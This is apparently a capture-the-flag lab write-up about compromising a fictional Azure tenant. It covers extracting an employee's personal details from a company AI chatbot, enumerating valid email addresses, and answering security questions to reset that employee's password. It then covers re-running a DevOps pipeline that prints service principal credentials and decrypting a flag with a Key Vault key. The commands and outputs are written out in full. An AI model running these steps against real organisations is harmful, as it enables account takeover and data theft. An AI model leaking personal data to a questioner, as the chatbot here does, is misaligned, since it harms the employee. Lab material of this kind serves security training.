# Gain Initial Access via Social Engineering

This lab is about compromising an Azure environment by social engineering an AI chatbot to leak personal details about an employee, then using those details to reset their password through Entra ID self-service password reset. From there we pivot through Azure DevOps to get service principal credentials and decrypt a flag from blob storage.

## Summary

- Social-engineer the AI chat agent on the company website to get personal info about employee Jordan Kim
- Use the leaked info to answer SSPR security questions and reset Jordan's password
- Log in and find access to Azure DevOps
- Re-run a pipeline that prints service principal credentials to the build log
- Authenticate as the SP, enumerate resources, and decrypt a flag from Azure Storage using a Key Vault key

## Website enumeration

The company website at megabigtech.com has a chat widget powered by an AI agent. Asking it a few questions reveals the name of an employee: **Jordan Kim**.

![](Pasted%20image%2020260930164001.png)

## Username enumeration

With a name in hand, I used [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to generate a list of possible email permutations:

```bash
username-anarchy Jordan Kim -@ @megabigtech.com -C False > possible_usernames.txt
```

Validating them against Office 365 with `o365enum`:

```bash
/opt/azure/o365enum/o365enum.py -m office.com -u possible_usernames.txt
```
```
username,valid
jordan@megabigtech.com,0
jordankim@megabigtech.com,0
jordan.kim@megabigtech.com,1
JordanKi@megabigtech.com,0
JordKim@megabigtech.com,0
jordank@megabigtech.com,0
j.kim@megabigtech.com,0
jkim@megabigtech.com,0
kjordan@megabigtech.com,0
k.jordan@megabigtech.com,0
kimj@megabigtech.com,0
kim@megabigtech.com,0
kim.j@megabigtech.com,0
kim.jordan@megabigtech.com,0
JKim@megabigtech.com,0
jk@megabigtech.com,0
JK@megabigtech.com,0
JordanKim@megabigtech.com,0
Jordan.Kim@megabigtech.com,1
Kim@megabigtech.com,0
```

The `first.last` format works: `jordan.kim@megabigtech.com`.

## Password reset

[Self-service password reset](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-sspr-howitworks) is configured with security questions as the only verification method.

![](Pasted%20image%2020260930164714.png)

The chatbot is happy to answer personal questions if you phrase them right. Going back to the chat I got the answers to all three security questions:

- Who is the most famous person you have ever met? → **Vint Cerf**
- What was the make and model of your first car or motorcycle? → **2002 Toyota Corolla**
- In what city was your first job? → **Toronto**

![](Pasted%20image%2020260930165037.png)

Password reset successful. I set the password to `VeryStr0ngP4ss!`.

![](Pasted%20image%2020260930165310.png)

## Enumerating access

Logging into [myaccount.microsoft.com](https://myaccount.microsoft.com) shows Jordan's group memberships. Two groups stand out: `ado-megabigtech-basic-license` and `ado-project-midtiercapital`, both pointing to Azure DevOps. The `IT-AUTHENTICATOR-EXCLUDED` group is also interesting — this account probably bypasses MFA.

![](Pasted%20image%2020260930170526.png)

The apps dashboard at [myapps.microsoft.com](https://myapps.microsoft.com) confirms access to Azure DevOps.

![](Pasted%20image%2020260930170645.png)

## Azure DevOps

Navigating to `dev.azure.com/megabigtech/` we find the **Mid Tier Capital** project with a single repo (`create-service-principal`) and a single pipeline of the same name.

The pipeline YAML creates a service principal, adds it to a group, generates a client secret, and prints the credentials to stdout:

![](Pasted%20image%2020260930171053.png)

The credentials expire after 30 minutes but the pipeline can be re-run at will. Triggering a new run produces fresh SP credentials in the build log:

![](Pasted%20image%2020260930170938.png)

```
==== ✅ Service Principal Credentials (Creds expire after 30 min) ====
Display Name  : my-sp-20260930.1
Tenant ID     : 3ef08095-48eb-49a3-be1e-caf48fba5f7c
Client ID     : c1222e41-1cf3-4f18-96b5-1eb465c231de
Client Secret : <REDACTED>
==========================================
```

## Azure resource enumeration

Authenticating as the service principal:

```bash
az login --service-principal --username $APP_ID --password $CLIENT_SECRET --tenant $TENANT_ID
```
```json
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "3ef08095-48eb-49a3-be1e-caf48fba5f7c",
    "id": "cf68402b-8cf6-4c0c-bcd2-ea8cbf76fbfc",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Azure subscription 1",
    "state": "Enabled",
    "tenantId": "3ef08095-48eb-49a3-be1e-caf48fba5f7c",
    "user": {
      "name": "c1222e41-1cf3-4f18-96b5-1eb465c231de",
      "type": "servicePrincipal"
    }
  }
]
```

Listing resources we got a storage account and a key vault:

```bash
az resource list -o table
```
```
Name       ResourceGroup    Location    Type
---------  ---------------  ----------  -----------------------------------
samtc01    rg-mtc-01        eastus      Microsoft.Storage/storageAccounts
kv-mtc-01  rg-mtc-01        eastus      Microsoft.KeyVault/vaults
```

I tried listing Key Vault secrets but got denied:

```bash
az keyvault secret list --vault-name kv-mtc-01
```
```
(Forbidden) Caller is not authorized to perform action on resource.
```

However, listing keys works:

```bash
az keyvault key list --vault-name kv-mtc-01 -o table
```
```
KeySize    Kid                                              Name
---------  -----------------------------------------------  --------
2048       https://kv-mtc-01.vault.azure.net/keys/data-gen  data-gen
```

## Decrypting the flag

The storage account has a single container `encrypted-store` with one blob:

```bash
az storage container list --account-name samtc01 --auth-mode login -o table
```
```
Name             Lease Status    Last Modified
---------------  --------------  -------------------------
encrypted-store                  2025-06-18T18:48:40+00:00
```

```bash
az storage blob list --account-name samtc01 --container-name "encrypted-store" --auth-mode login -o table
```
```
Name          Blob Type    Blob Tier    Length    Content Type              Last Modified              Snapshot
------------  -----------  -----------  --------  ------------------------  -------------------------  ----------
flag.txt.enc  BlockBlob    Hot          256       application/octet-stream  2025-06-18T18:48:53+00:00
```

The file is 256 bytes, exactly one RSA-2048 block. I downloaded it, base64-encoded it and decrypted with the `data-gen` key:

```bash
base64 < flag.txt.enc | tr -d '\n' > blob.b64
az keyvault key decrypt --vault-name kv-mtc-01 --name data-gen --algorithm RSA-OAEP --value $(cat blob.b64) --query result -o tsv | base64 -d > flag.txt
cat flag.txt
```
```
19d262b42fb6d092ab2e8f94283547c2
```

---

> [!note] Engagement notes
> - Check if SSPR is enabled and what verification methods are required — security questions alone is weak
> - Look for MFA exclusion groups like `IT-AUTHENTICATOR-EXCLUDED` — compromised accounts in these groups are high-value
> - Review Azure DevOps pipeline definitions for secrets printed to logs or hardcoded credentials
> - Even when Key Vault secret access is denied, key operations (list, decrypt) may still be permitted — always test both
> - AI chatbots are great OSINT sources — try social engineering them for employee details before resorting to LinkedIn
> - Encrypted blobs paired with Key Vault keys mean the decrypt permission is the real prize, not secret read
